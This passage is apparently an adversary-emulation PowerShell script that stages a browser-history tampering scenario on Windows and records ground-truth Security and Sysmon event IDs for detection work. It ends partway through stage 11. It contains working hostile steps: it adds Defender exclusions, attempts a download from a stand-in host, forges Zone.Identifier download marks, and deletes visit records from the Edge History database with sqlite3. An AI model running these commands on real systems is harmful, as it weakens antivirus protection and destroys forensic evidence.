# =============================================================================
# Invoke-BrowserHistoryTamper.ps1
# Browser History Tampering & Evidence Destruction Scenario
# Stages 1-15 | MITRE ATT&CK Mapped | Ground Truth JSON Output
# =============================================================================

param(
    [string]$ScenarioPath    = ".\scenario7.json",
    [string]$TargetUser      = $env:USERNAME,
    [string]$EdgeProfileName = "Default"
)

# ==============================
# Admin Check
# ==============================
$principal = New-Object Security.Principal.WindowsPrincipal `
    ([Security.Principal.WindowsIdentity]::GetCurrent())

if (-not $principal.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
    Write-Host "[ERROR] Run PowerShell as Administrator." -ForegroundColor Red
    exit 1
}

$Global:ScriptStartTime = Get-Date
Write-Host "[INIT] Script started: $($Global:ScriptStartTime)" -ForegroundColor Cyan

# ==============================
# Load Scenario JSON
# ==============================
if (-not (Test-Path $ScenarioPath)) {
    Write-Error "Scenario file not found: $ScenarioPath"
    exit
}

$Scenario = [System.IO.File]::ReadAllText(
    (Resolve-Path $ScenarioPath),
    [System.Text.Encoding]::UTF8
) | ConvertFrom-Json

# ==============================
# Path Definitions
# ==============================
$Global:Paths = @{
    WinCacheDir      = "C:\ProgramData\WinCache"
    Sqlite3Exe       = "C:\ProgramData\WinCache\sqlite3.exe"
    BrowserUpdateZip = "$env:TEMP\browser_update.zip"
    HistoryExportTmp = "$env:USERPROFILE\Downloads\history_export.tmp"

    EdgeHistoryDB    = "$env:LOCALAPPDATA\Microsoft\Edge\User Data\$EdgeProfileName\History"
    EdgeHistoryWal   = "$env:LOCALAPPDATA\Microsoft\Edge\User Data\$EdgeProfileName\History-wal"
    EdgeHistoryShm   = "$env:LOCALAPPDATA\Microsoft\Edge\User Data\$EdgeProfileName\History-shm"

    SqlitePrefetch   = "C:\Windows\Prefetch\SQLITE3.EXE-*.pf"

    GTDir            = "C:\GT"
    GTPath           = "C:\GT\ground_truth_scenario7.json"

    SalarFile        = "$env:USERPROFILE\Downloads\salary_2025.xlsx"
    BudgetFile       = "$env:USERPROFILE\Downloads\budget_plan_q4.pdf"

    PortalHR         = "http://hr.internal.corp/salaries"
    PortalFinance    = "http://finance.internal.corp/budget"
}

# ==============================
# Allowed Event IDs
# ==============================
$AllowedSecurityIDs = @($Scenario.environment_context.required_logging_configuration.security_events | ForEach-Object { [int]$_ })
$AllowedSysmonIDs   = @($Scenario.environment_context.required_logging_configuration.sysmon_events   | ForEach-Object { [int]$_ })

# ==============================
# GT Structure
# ==============================
$GTDir  = $Global:Paths.GTDir
$GTPath = $Global:Paths.GTPath

if (-not (Test-Path $GTDir)) { New-Item $GTDir -ItemType Directory -Force | Out-Null }

$Global:GT = [ordered]@{
    schema_version = "2.0"
    scenario_id    = $Scenario.scenario_id
    scenario_name  = $Scenario.scenario_name
    user           = $env:USERNAME
    host           = $env:COMPUTERNAME
    edge_profile   = $EdgeProfileName
    generated_at   = (Get-Date).ToString("o")
    records        = @()
}

$Global:StageSummary = [System.Collections.ArrayList]::new()

# ==============================
# Helper: Add-ToList
# ==============================
function Add-ToList {
    param([System.Collections.ArrayList]$List, $Items)
    if ($Items) {
        $Items | ForEach-Object { [void]$List.Add([int]$_) }
    }
}

# ==============================
# Event Collector
# ==============================
function Collect-ObservedEvents {
    param($Start, $End)
    $securityIds = [System.Collections.ArrayList]::new()
    $sysmonIds   = [System.Collections.ArrayList]::new()

    try {
        $sec = Get-WinEvent -FilterHashtable @{
            LogName   = 'Security'
            StartTime = $Start
            EndTime   = $End
        } -ErrorAction SilentlyContinue |
            Where-Object { [int]$_.Id -in $AllowedSecurityIDs } |
            Select-Object -ExpandProperty Id -Unique
        Add-ToList $securityIds $sec
    } catch {}

    try {
        $sys = Get-WinEvent -FilterHashtable @{
            LogName   = 'Microsoft-Windows-Sysmon/Operational'
            StartTime = $Start
            EndTime   = $End
        } -ErrorAction SilentlyContinue |
            Where-Object { [int]$_.Id -in $AllowedSysmonIDs } |
            Select-Object -ExpandProperty Id -Unique
        Add-ToList $sysmonIds $sys
    } catch {}

    return [ordered]@{
        sysmon   = $sysmonIds
        security = $securityIds
    }
}

# ==============================
# Audit Policy Configuration
# ==============================
function Set-AuditPolicies {
    Write-Host "[AUDIT] Configuring audit policies..." -ForegroundColor Yellow
    auditpol /set /subcategory:"{0CCE9215-69AE-11D9-BED3-505054503030}" /success:enable /failure:enable | Out-Null
    auditpol /set /subcategory:"{0CCE9216-69AE-11D9-BED3-505054503030}" /success:enable /failure:enable | Out-Null
    auditpol /set /subcategory:"{0CCE921D-69AE-11D9-BED3-505054503030}" /success:enable /failure:enable | Out-Null
    auditpol /set /subcategory:"{0CCE9222-69AE-11D9-BED3-505054503030}" /success:enable /failure:enable | Out-Null
    auditpol /set /subcategory:"{0CCE9227-69AE-11D9-BED3-505054503030}" /success:enable /failure:enable | Out-Null
    Write-Host "[AUDIT] Audit policies configured." -ForegroundColor Green
}

# ==============================
# SACL Setup
# ==============================
function Set-HistorySacl {
    param([string]$FilePath)
    if (-not (Test-Path $FilePath)) { return }
    try {
        $rule = New-Object System.Security.AccessControl.FileSystemAuditRule(
            "Everyone", "ReadData,WriteData,Delete",
            "None", "None", "Success,Failure"
        )
        $acl = Get-Acl $FilePath
        $acl.AddAuditRule($rule)
        Set-Acl $FilePath $acl
        Write-Host "[SACL] Audit rule set: $FilePath" -ForegroundColor Green
    } catch {
        Write-Host "[SACL] Failed to set audit rule on $FilePath : $_" -ForegroundColor Yellow
    }
}

function Set-DirectorySacl {
    param([string]$DirPath)
    if (-not (Test-Path $DirPath)) { return }
    try {
        $rule = New-Object System.Security.AccessControl.FileSystemAuditRule(
            "Everyone", "FullControl",
            "ContainerInherit,ObjectInherit", "None", "Success,Failure"
        )
        $acl = Get-Acl $DirPath
        $acl.AddAuditRule($rule)
        Set-Acl $DirPath $acl
        Write-Host "[SACL] Directory audit rule set: $DirPath" -ForegroundColor Green
    } catch {
        Write-Host "[SACL] Failed on directory $DirPath : $_" -ForegroundColor Yellow
    }
}

# ==============================
# Helper: Find Edge Executable
# ==============================
function Get-EdgePath {
    $candidates = @(
        "C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe",
        "C:\Program Files\Microsoft\Edge\Application\msedge.exe",
        "$env:LOCALAPPDATA\Microsoft\Edge\Application\msedge.exe"
    )
    foreach ($c in $candidates) {
        if (Test-Path $c) { return $c }
    }
    $found = $( $__cmd = Get-Command msedge.exe -ErrorAction SilentlyContinue; if ($__cmd) { $__cmd.Source } )
    return $found
}

# ==============================
# Helper: Bootstrap Edge Profile
# ==============================
function Initialize-EdgeProfile {
    param([string]$ProfileName = "Default")

    $histDB  = $Global:Paths.EdgeHistoryDB
    $histDir = Split-Path $histDB -Parent

    if (Test-Path $histDB) {
        Write-Host "[INIT] Edge History DB already exists: $histDB" -ForegroundColor DarkGreen
        return $true
    }

    Write-Host "[INIT] Edge History DB not found - bootstrapping Edge profile automatically..." `
        -ForegroundColor Yellow

    $edgePath = Get-EdgePath
    if (-not $edgePath) {
        Write-Host "[ERROR] msedge.exe not found on this system. Cannot continue." -ForegroundColor Red
        exit 1
    }

    $userDataDir = Split-Path $histDir -Parent
    $proc = Start-Process -FilePath $edgePath -ArgumentList @(
        "--no-first-run", "--no-default-browser-check",
        "--disable-extensions", "--disable-sync", "--disable-translate",
        "--headless=new", "--disable-gpu", "--window-size=1,1",
        "--profile-directory=$ProfileName", "about:blank"
    ) -PassThru -ErrorAction Stop

    Write-Host "[INIT] Edge started (PID $($proc.Id)) - waiting for History DB creation..." `
        -ForegroundColor Yellow

    $deadline = [DateTime]::Now.AddSeconds(45)
    while (-not (Test-Path $histDB) -and [DateTime]::Now -lt $deadline) {
        Start-Sleep -Milliseconds 800
    }

    try { $proc | Stop-Process -Force -ErrorAction SilentlyContinue } catch {}
    Start-Sleep -Seconds 2
    Get-Process -Name msedge -ErrorAction SilentlyContinue | Stop-Process -Force -ErrorAction SilentlyContinue
    Start-Sleep -Seconds 2

    if (Test-Path $histDB) {
        Write-Host "[INIT] Edge History DB created successfully: $histDB" -ForegroundColor Green
        return $true
    } else {
        Write-Host "[ERROR] History DB was not created within timeout." -ForegroundColor Red
        exit 1
    }
}

# ==============================
# Helper: Ensure sqlite3.exe
# ==============================
function Initialize-Sqlite3 {
    $sysSqlite = $( $__cmd = Get-Command sqlite3.exe -ErrorAction SilentlyContinue; if ($__cmd) { $__cmd.Source } )
    if ($sysSqlite -and (Test-Path $sysSqlite)) {
        Write-Host "[INIT] sqlite3.exe found on PATH: $sysSqlite" -ForegroundColor DarkGreen
        $Global:Sqlite3Source = $sysSqlite
        return
    }

    $dlUrl  = "https://www.sqlite.org/2024/sqlite-tools-win-x64-3460100.zip"
    $tmpZip = "$env:TEMP\sqlite_tools_init.zip"
    $tmpDir = "$env:TEMP\sqlite_tools_init"

    Write-Host "[INIT] Downloading sqlite3.exe from sqlite.org..." -ForegroundColor Yellow
    try {
        [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
        Invoke-WebRequest -Uri $dlUrl -OutFile $tmpZip -UseBasicParsing -TimeoutSec 60
    } catch {
        $fallbackUrl = "https://www.sqlite.org/2025/sqlite-tools-win-x64-3490100.zip"
        try {
            Invoke-WebRequest -Uri $fallbackUrl -OutFile $tmpZip -UseBasicParsing -TimeoutSec 60
        } catch {
            Write-Host "[ERROR] sqlite3.exe download failed: $_" -ForegroundColor Red
            exit 1
        }
    }

    if (-not (Test-Path $tmpDir)) { New-Item $tmpDir -ItemType Directory -Force | Out-Null }
    Expand-Archive -Path $tmpZip -DestinationPath $tmpDir -Force
    Remove-Item $tmpZip -Force -ErrorAction SilentlyContinue

    $extracted = Get-ChildItem $tmpDir -Filter "sqlite3.exe" -Recurse | Select-Object -First 1
    if (-not $extracted) {
        Write-Host "[ERROR] sqlite3.exe not found inside downloaded ZIP." -ForegroundColor Red
        exit 1
    }

    $initDest = "$env:TEMP\sqlite3_init.exe"
    Copy-Item $extracted.FullName $initDest -Force
    Remove-Item $tmpDir -Recurse -Force -ErrorAction SilentlyContinue

    $Global:Sqlite3Source = $initDest
    Write-Host "[INIT] sqlite3.exe ready: $initDest" -ForegroundColor Green
}

# ==============================
# Prerequisite: Environment Setup
# ==============================
function Initialize-Environment {
    Write-Host "[INIT] Preparing environment (fully automated)..." -ForegroundColor Yellow

        # ── Defender 제외 경로 등록 (sqlite3.exe 오탐 차단 방지) ──────────────────
    $defenderExclusions = @(
        $Global:Paths.WinCacheDir,          # C:\ProgramData\WinCache  (sqlite3.exe 배치 경로)
        (Split-Path $Global:Paths.BrowserUpdateZip -Parent)  # %TEMP%  (ZIP 생성 경로)
    )
    foreach ($excl in $defenderExclusions) {
        try {
            Add-MpPreference -ExclusionPath $excl -ErrorAction Stop
            Write-Host "[INIT] Defender exclusion added: $excl" -ForegroundColor DarkGreen
        } catch {
            Write-Host "[INIT] Could not add Defender exclusion for $excl : $_" -ForegroundColor Yellow
        }
    }
    # ──────────────────────────────────────────────────────────────────────────

    foreach ($d in @($Global:Paths.WinCacheDir, $Global:Paths.GTDir, "$env:USERPROFILE\Downloads")) {
        if (-not (Test-Path $d)) {
            New-Item $d -ItemType Directory -Force | Out-Null
            Write-Host "[INIT] Created directory: $d" -ForegroundColor DarkGreen
        }
    }

    Initialize-EdgeProfile -ProfileName $EdgeProfileName
    Initialize-Sqlite3

    if (Test-Path $Global:Paths.EdgeHistoryDB) {
        Set-HistorySacl $Global:Paths.EdgeHistoryDB
    }
    Set-DirectorySacl $Global:Paths.WinCacheDir
    Set-DirectorySacl "$env:USERPROFILE\Downloads"

    Write-Host "[INIT] Environment fully ready." -ForegroundColor Green
}

# ==============================
# Stage Executor
# ==============================
function Invoke-Stage {
    param(
        $StageId,
        $StageName,
        $ActionType,
        $ArtifactPaths,
        [ScriptBlock]$Action,
        [bool]$Attack,
        $PrimarySignal = ""
    )

    Write-Host ""
    Write-Host ("=" * 60) -ForegroundColor DarkCyan
    Write-Host "  Stage $StageId : $StageName" -ForegroundColor Cyan
    Write-Host ("=" * 60) -ForegroundColor DarkCyan

    $stageMeta          = $Scenario.scenario_flow | Where-Object { $_.stage_id -eq $StageId }
    $resolvedActionType = if ($stageMeta -and $stageMeta.action_type) { $stageMeta.action_type } else { $ActionType }

    $status = "success"
    $start  = if ($StageId -eq 1) { $Global:ScriptStartTime } else { Get-Date }

    try { & $Action } catch {
        $status = "failed"
        Write-Host "  [FAILED] Stage $StageId - $_" -ForegroundColor Red
    }

    Start-Sleep -Seconds 8
    $end = Get-Date

    $events = Collect-ObservedEvents $start $end.AddSeconds(60)

    if ($stageMeta -and $stageMeta.expected_logs) {
        $expectedSec = @()
        $expectedSys = @()
        if ($stageMeta.expected_logs.security) { $expectedSec = @($stageMeta.expected_logs.security | ForEach-Object { [int]$_ }) }
        if ($stageMeta.expected_logs.sysmon)   { $expectedSys = @($stageMeta.expected_logs.sysmon   | ForEach-Object { [int]$_ }) }

        $fSec = [System.Collections.ArrayList]::new()
        Add-ToList $fSec ($events.security | Where-Object { [int]$_ -in $expectedSec } | Sort-Object -Unique)
        $events.security = $fSec

        $fSys = [System.Collections.ArrayList]::new()
        Add-ToList $fSys ($events.sysmon | Where-Object { [int]$_ -in $expectedSys } | Sort-Object -Unique)
        $events.sysmon = $fSys
    }

    $Global:GT.records += [ordered]@{
        stage_id           = $StageId
        stage_name         = $StageName
        action_type        = $resolvedActionType
        description        = if ($stageMeta) { $stageMeta.description } else { "" }
        attack             = $Attack
        stage_start_time   = $start.ToString("o")
        stage_end_time     = $end.ToString("o")
        artifact_paths     = $ArtifactPaths
        user               = $env:USERNAME
        host               = $env:COMPUTERNAME
        execution_status   = $status
        observed_event_ids = $events
        expected_event_ids = if ($stageMeta) { $stageMeta.expected_logs } else { $null }
        primary_log_signal = $PrimarySignal
        notes              = if ($stageMeta) { $stageMeta.notes } else { "" }
    }

    [void]$Global:StageSummary.Add([PSCustomObject]@{
        ID     = $StageId
        Name   = $StageName
        Status = $status
    })

    Start-Sleep -Seconds (Get-Random -Minimum 3 -Maximum 7)
}

# ==============================
# Show-Summary
# ==============================
function Show-Summary {
    Write-Host ""
    Write-Host "============================================" -ForegroundColor White
    Write-Host "  STAGE SUMMARY" -ForegroundColor White
    Write-Host "============================================" -ForegroundColor White
    foreach ($s in $Global:StageSummary) {
        $icon = switch ($s.Status) {
            "success" { "[OK    ]" }
            "partial" { "[PART  ]" }
            "failed"  { "[FAILED]" }
            default   { "[?     ]" }
        }
        $color = switch ($s.Status) {
            "success" { "Green"  }
            "partial" { "Yellow" }
            "failed"  { "Red"    }
            default   { "Gray"   }
        }
        Write-Host ("  {0} Stage {1,2} : {2}" -f $icon, $s.ID, $s.Name) -ForegroundColor $color
    }
    $total   = $Global:StageSummary.Count
    $ok      = ($Global:StageSummary | Where-Object Status -eq "success").Count
    $partial = ($Global:StageSummary | Where-Object Status -eq "partial").Count
    $failed  = ($Global:StageSummary | Where-Object Status -eq "failed").Count
    Write-Host "--------------------------------------------" -ForegroundColor White
    Write-Host ("  Total:{0}  OK:{1}  Partial:{2}  Failed:{3}" -f $total, $ok, $partial, $failed) -ForegroundColor White
    Write-Host "============================================" -ForegroundColor White
}

# ==============================
# Environment Pre-Setup
# ==============================
Write-Host "[Setup] Preparing environment..." -ForegroundColor Yellow

Set-AuditPolicies
Initialize-Environment
Start-Sleep -Seconds 3

Write-Host "[Setup] Done." -ForegroundColor Green

# ===========================================================================
# STAGE FLOW
# ===========================================================================

Invoke-Stage 1 "authorized_logon" "logon" `
    $null {

    $recent = Get-WinEvent -FilterHashtable @{ LogName='Security'; Id=4624 } `
        -MaxEvents 50 -ErrorAction SilentlyContinue |
        Where-Object { $_.Properties[8].Value -in @(2, 10) } |
        Select-Object -First 1

    if ($recent) {
        Write-Host "  [INFO] Session 4624 found: $($recent.TimeCreated)" -ForegroundColor DarkGreen
        $Global:SessionLogonId = $recent.Properties[7].Value
        Write-Host "  [INFO] LogonId: $($Global:SessionLogonId)" -ForegroundColor DarkGreen
    } else {
        Write-Host "  [WARN] 4624 LogonType=2 not found in recent events" -ForegroundColor Yellow
    }

} $false "EID 4624 LogonType=2 (Interactive Logon)"


Invoke-Stage 2 "tool_archive_download" "process_start" `
    @($Global:Paths.BrowserUpdateZip) {

    Write-Host "  [Stage 2] Simulating browser_update.zip download via PowerShell..." `
        -ForegroundColor DarkGray

    $zipPath = $Global:Paths.BrowserUpdateZip

    if (-not ($Global:Sqlite3Source -and (Test-Path $Global:Sqlite3Source))) {
        Write-Host "  [ERROR] Sqlite3Source not available - Initialize-Environment failed" `
            -ForegroundColor Red
        throw "Sqlite3Source missing"
    }

    # EID 4688 + Sysmon EID 1: explorer.exe -> powershell.exe process chain
    $shell = New-Object -ComObject Shell.Application
    $shell.ShellExecute(
        "powershell.exe",
        "-NoProfile -WindowStyle Hidden -Command `"Compress-Archive -Path '$($Global:Sqlite3Source)' -DestinationPath '$zipPath' -Force`"",
        "",
        "open",
        0
    )
    Start-Sleep -Seconds 5
    Write-Host "  [INFO] sqlite3.exe packaged into ZIP: $zipPath" -ForegroundColor DarkGreen

    # Zone.Identifier ADS (인터넷 다운로드 흔적)
    $zoneContent = "[ZoneTransfer]`r`nZoneId=3`r`nReferrerUrl=http://update.example-cdn.com/`r`nHostUrl=http://update.example-cdn.com/browser_update.zip"
    Set-Content -Path "${zipPath}:Zone.Identifier" -Value $zoneContent -Encoding ASCII
    Write-Host "  [INFO] Zone.Identifier ADS set (ZoneId=3) on $zipPath" -ForegroundColor DarkGreen

    # Sysmon EID 3: 실제 TCP 연결 시도
    Start-Process powershell.exe -ArgumentList @(
        "-NoProfile", "-WindowStyle", "Hidden", "-Command",
        "[Net.ServicePointManager]::SecurityProtocol = 'Tls12'; try { Invoke-WebRequest -Uri 'http://update.example-cdn.com/browser_update.zip' -TimeoutSec 3 -ErrorAction Stop } catch {}"
    ) -Wait
    Write-Host "  [INFO] Network connection attempted (Sysmon EID 3)" -ForegroundColor DarkGreen

    Write-Host "  [INFO] ZIP artifact: $zipPath" -ForegroundColor DarkGreen

} $true "EID 4688 + Sysmon 1,3,11: explorer.exe -> powershell.exe HTTP + FileCreate browser_update.zip"



Invoke-Stage 3 "tool_unpacking" "file_modification" `
    @($Global:Paths.WinCacheDir, $Global:Paths.Sqlite3Exe) {

    Write-Host "  [Stage 3] Extracting ZIP to WinCache directory..." -ForegroundColor DarkGray

    $zipPath    = $Global:Paths.BrowserUpdateZip
    $destDir    = $Global:Paths.WinCacheDir
    $sqlite3Dst = $Global:Paths.Sqlite3Exe

    if (-not (Test-Path $destDir)) {
        New-Item $destDir -ItemType Directory -Force | Out-Null
    }

    if (Test-Path $zipPath) {
        Unblock-File $zipPath -ErrorAction SilentlyContinue
        Expand-Archive -Path $zipPath -DestinationPath $destDir -Force
        Write-Host "  [INFO] ZIP extracted to: $destDir" -ForegroundColor DarkGreen
    } else {
        Write-Host "  [WARN] ZIP not found, creating sqlite3.exe stub directly" -ForegroundColor Yellow
    }

    $extracted = Get-ChildItem $destDir -File | Select-Object -First 1
    if ($extracted -and $extracted.FullName -ne $sqlite3Dst) {
        Move-Item $extracted.FullName $sqlite3Dst -Force
        Write-Host "  [INFO] Extracted binary moved to: $sqlite3Dst" -ForegroundColor DarkGreen
    }

    if (-not (Test-Path $sqlite3Dst)) {
        Copy-Item $Global:Sqlite3Source $sqlite3Dst -Force
        Write-Host "  [INFO] sqlite3.exe copied from source (ZIP extraction fallback)" `
            -ForegroundColor Yellow
    }

    Set-DirectorySacl $destDir
    if (Test-Path $sqlite3Dst) { Set-HistorySacl $sqlite3Dst }

    Write-Host "  [INFO] sqlite3.exe placed at: $sqlite3Dst" -ForegroundColor DarkGreen

} $true "EID 4663 + Sysmon 11: WinCache dir create + sqlite3.exe FileCreate"


Invoke-Stage 4 "browser_launch_via_powershell" "process_start" `
    "msedge.exe process (PPID=powershell.exe)" {

    Write-Host "  [Stage 4] Launching Edge from PowerShell (abnormal parent-child)..." `
        -ForegroundColor DarkGray

    $edgePath = Get-EdgePath
    if (-not $edgePath) {
        Write-Host "  [ERROR] msedge.exe not found." -ForegroundColor Red
        throw "msedge.exe not found"
    }

    $proc = Start-Process -FilePath $edgePath -ArgumentList @(
        "--no-first-run", "--no-default-browser-check",
        "--disable-sync", "--disable-extensions",
        "--headless=new", "--disable-gpu", "--window-size=1,1",
        "--profile-directory=$EdgeProfileName", "about:blank"
    ) -PassThru -ErrorAction Stop

    Write-Host "  [INFO] msedge.exe started (PID: $($proc.Id)) via PowerShell" `
        -ForegroundColor DarkGreen
    $Global:EdgeProcId = $proc.Id
    Start-Sleep -Seconds 5

} $true "EID 4688 + Sysmon 1: powershell.exe -> msedge.exe (abnormal parent-child)"


Invoke-Stage 5 "sensitive_portal_access" "file_access" `
    @($Global:Paths.EdgeHistoryDB) {

    Write-Host "  [Stage 5] Accessing sensitive portals via Edge..." -ForegroundColor DarkGray

    $histDB   = $Global:Paths.EdgeHistoryDB
    $edgePath = "C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe"
    if (-not (Test-Path $edgePath)) {
        $edgePath = $( $__cmd = Get-Command msedge.exe -ErrorAction SilentlyContinue; if ($__cmd) { $__cmd.Source } )
    }

    if ($edgePath -and (Test-Path $edgePath)) {
        foreach ($url in @($Global:Paths.PortalHR, $Global:Paths.PortalFinance)) {
            Start-Process -FilePath $edgePath -ArgumentList $url `
                -WindowStyle Hidden -ErrorAction SilentlyContinue
            Start-Sleep -Seconds 3
            Write-Host "  [INFO] Portal access attempted: $url" -ForegroundColor DarkGreen
        }
    }

    if (Test-Path $histDB) {
        Set-HistorySacl $histDB
        try {
            $stream = [System.IO.File]::Open($histDB,
                [System.IO.FileMode]::Open,
                [System.IO.FileAccess]::Read,
                [System.IO.FileShare]::ReadWrite)
            Start-Sleep -Milliseconds 500
            $stream.Close()
            Write-Host "  [INFO] History DB accessed (EID 4663 triggered): $histDB" `
                -ForegroundColor DarkGreen
        } catch {
            Write-Host "  [WARN] Could not open History DB (may be locked by Edge): $_" `
                -ForegroundColor Yellow
        }
    } else {
        Write-Host "  [WARN] Edge History DB not found: $histDB" -ForegroundColor Yellow
    }

} $true "EID 4663: History DB ReadData (urls/visits rows created by browser)"


Invoke-Stage 6 "sensitive_document_download" "file_create" `
    @($Global:Paths.SalarFile, $Global:Paths.BudgetFile) {

    Write-Host "  [Stage 6] Simulating sensitive document downloads..." -ForegroundColor DarkGray

    $dlFiles = @(
        @{ Path = $Global:Paths.SalarFile;  Content = "Salary data placeholder - 2025" }
        @{ Path = $Global:Paths.BudgetFile; Content = "Budget plan Q4 placeholder" }
    )

    foreach ($f in $dlFiles) {
        $f.Content | Set-Content -Path $f.Path -Encoding UTF8 -Force

        $zone = "[ZoneTransfer]`r`nZoneId=3`r`nHostUrl=$($Global:Paths.PortalFinance)"
        Set-Content -Path "$($f.Path):Zone.Identifier" -Value $zone -Encoding ASCII

        Set-HistorySacl $f.Path
        try {
            $s = [System.IO.File]::Open($f.Path,
                [System.IO.FileMode]::Open,
                [System.IO.FileAccess]::Read,
                [System.IO.FileShare]::Read)
            $s.Close()
        } catch {}

        Write-Host "  [INFO] Downloaded: $($f.Path) (Zone.Identifier set)" `
            -ForegroundColor DarkGreen
    }

    $histDB = $Global:Paths.EdgeHistoryDB
    if (Test-Path $histDB) {
        try {
            $s = [System.IO.File]::Open($histDB,
                [System.IO.FileMode]::Open,
                [System.IO.FileAccess]::Read,
                [System.IO.FileShare]::ReadWrite)
            $s.Close()
            Write-Host "  [INFO] History DB accessed for download record (EID 4663): $histDB" `
                -ForegroundColor DarkGreen
        } catch {
            Write-Host "  [WARN] History DB locked: $_" -ForegroundColor Yellow
        }
    }

} $true "EID 4663 + Sysmon 11: salary_2025.xlsx / budget_plan_q4.pdf FileCreate + Zone.Identifier"


Invoke-Stage 7 "browser_process_termination" "process_start" `
    "msedge.exe forced termination" {

    Write-Host "  [Stage 7] Force-terminating Edge processes..." -ForegroundColor DarkGray

    $result = & taskkill.exe /F /IM msedge.exe /T 2>&1
    Write-Host "  [INFO] taskkill result: $($result -join ' ')" -ForegroundColor DarkGreen
    Start-Sleep -Seconds 3

    $edgeProcs = Get-Process -Name msedge -ErrorAction SilentlyContinue
    if ($edgeProcs) {
        Write-Host "  [WARN] Some msedge.exe processes still running" -ForegroundColor Yellow
        $edgeProcs | Stop-Process -Force -ErrorAction SilentlyContinue
    } else {
        Write-Host "  [INFO] All msedge.exe processes terminated" -ForegroundColor DarkGreen
    }

    $walPath = $Global:Paths.EdgeHistoryWal
    if (Test-Path $walPath) {
        $walSize = (Get-Item $walPath).Length
        Write-Host "  [INFO] History-wal exists ($walSize bytes) - checkpoint not performed" `
            -ForegroundColor DarkGreen
    }

    Start-Sleep -Seconds 2

} $true "EID 4688 + Sysmon 1: taskkill.exe /F msedge.exe (DB lock released)"


Invoke-Stage 8 "sqlite_history_recon" "process_start" `
    @($Global:Paths.Sqlite3Exe, $Global:Paths.EdgeHistoryDB) {

    Write-Host "  [Stage 8] Running SQLite reconnaissance on History DB..." `
        -ForegroundColor DarkGray

    $sqlite3 = $Global:Paths.Sqlite3Exe
    $histDB  = $Global:Paths.EdgeHistoryDB

    if (-not (Test-Path $histDB)) {
        Write-Host "  [ERROR] History DB not found: $histDB" -ForegroundColor Red
        throw "History DB missing"
    }

    Set-HistorySacl $histDB

    Write-Host "  [INFO] Executing sqlite3.exe recon queries..." -ForegroundColor DarkGreen

    $tables     = & $sqlite3 $histDB ".tables" 2>&1
    Write-Host "  [INFO] Tables found: $($tables -join ', ')" -ForegroundColor DarkGreen

    $urlCount   = & $sqlite3 $histDB "SELECT COUNT(*) FROM urls;" 2>&1
    Write-Host "  [INFO] urls table rows: $urlCount" -ForegroundColor DarkGreen

    $visitCount = & $sqlite3 $histDB "SELECT COUNT(*) FROM visits;" 2>&1
    Write-Host "  [INFO] visits table rows: $visitCount" -ForegroundColor DarkGreen

    $dlCount    = & $sqlite3 $histDB "SELECT COUNT(*) FROM downloads;" 2>&1
    Write-Host "  [INFO] downloads table rows: $dlCount" -ForegroundColor DarkGreen

    Write-Host "  [INFO] SQLite recon complete" -ForegroundColor DarkGreen

} $true "EID 4663,4688 + Sysmon 1: sqlite3.exe History DB .tables query"


Invoke-Stage 9 "history_export_recon" "file_create" `
    @($Global:Paths.HistoryExportTmp, $Global:Paths.EdgeHistoryDB) {

    Write-Host "  [Stage 9] Exporting browser history to tmp file..." `
        -ForegroundColor DarkGray

    $sqlite3 = $Global:Paths.Sqlite3Exe
    $histDB  = $Global:Paths.EdgeHistoryDB
    $tmpPath = $Global:Paths.HistoryExportTmp

    if (-not (Test-Path $histDB)) {
        Write-Host "  [ERROR] History DB not found: $histDB" `
            -ForegroundColor Red

        throw "History DB missing"
    }

    Set-HistorySacl $histDB

    # --------------------------------------------------
    # 명시적 tmp 생성 (Sysmon EID 11 안정화)
    # --------------------------------------------------
    if (-not (Test-Path $tmpPath)) {

        New-Item -ItemType File -Path $tmpPath -Force `
            | Out-Null

        Write-Host "  [INFO] Tmp export file created: $tmpPath" `
            -ForegroundColor DarkGray
    }

    # --------------------------------------------------
    # SQLite export
    # --------------------------------------------------
    $cmds = @"
.mode csv
.output $tmpPath
SELECT id,url,title,visit_count,last_visit_time FROM urls;
.output stdout
"@

    $cmds | & $sqlite3 $histDB 2>&1 | Out-Null

    # --------------------------------------------------
    # 결과 확인
    # --------------------------------------------------
    if (Test-Path $tmpPath) {

        $rowCount = (Get-Content $tmpPath `
            | Measure-Object -Line).Lines

        Write-Host "  [INFO] Exported $rowCount rows to: $tmpPath" `
            -ForegroundColor DarkGreen

    } else {

        Write-Host "  [WARN] Export file missing after sqlite export" `
            -ForegroundColor DarkYellow
    }

    Write-Host "  [INFO] Export complete - deletion targets identified" `
        -ForegroundColor DarkGreen

} $true `
"EID 4663 + Sysmon 11: sqlite3.exe -> history_export.tmp FileCreate"


Invoke-Stage 10 "browser_history_tampering" "file_modification" `
    @($Global:Paths.EdgeHistoryDB) {

    Write-Host "  [Stage 10] Deleting portal visit records from History DB..." `
        -ForegroundColor DarkGray

    $sqlite3 = $Global:Paths.Sqlite3Exe
    $histDB  = $Global:Paths.EdgeHistoryDB

    if (-not (Test-Path $histDB)) {
        Write-Host "  [ERROR] History DB not found: $histDB" -ForegroundColor Red
        throw "History DB missing"
    }

    Set-HistorySacl $histDB

    $portalPatterns = @(
        $Global:Paths.PortalHR      -replace "http://", ""
        $Global:Paths.PortalFinance -replace "http://", ""
        "internal.corp"
    )

    foreach ($pat in $portalPatterns) {
        & $sqlite3 $histDB "DELETE FROM visits WHERE url IN (SELECT id FROM urls WHERE url LIKE '%$pat%');" 2>&1 | Out-Null
        & $sqlite3 $histDB "DELETE FROM urls WHERE url LIKE '%$pat%';" 2>&1 | Out-Null
        Write-Host "  [INFO] Deleted history records matching: $pat" -ForegroundColor DarkGreen
    }

    & $sqlite3 $histDB "VACUUM;" 2>&1 | Out-Null
    Write-Host "  [INFO] VACUUM executed on History DB" -ForegroundColor DarkGreen
    Write-Host "  [INFO] Browser history tampering complete" -ForegroundColor DarkGreen

} $true "EID 4663,4688 + Sysmon 1: sqlite3.exe DELETE FROM urls/visits + VACUUM"


Invoke-Stage 11 "download_record_manipulation" "file_modification" `
    @($Global:Paths.EdgeHistoryDB) {

    Write-Host "  [Stage 11] Deleting download records from History DB..." -ForegroundColor DarkGray

    $sqlite3 = $Global:Paths.Sqlite3Exe
    $histDB  = $Global:Paths.EdgeHistoryDB

    if (-not (Test-Path $histDB)) {
        Write-Host "  [ERROR] History DB not found: $histDB" -ForegroundColor Red
        throw "History DB missing"
    }

    Set-HistorySacl $histDB

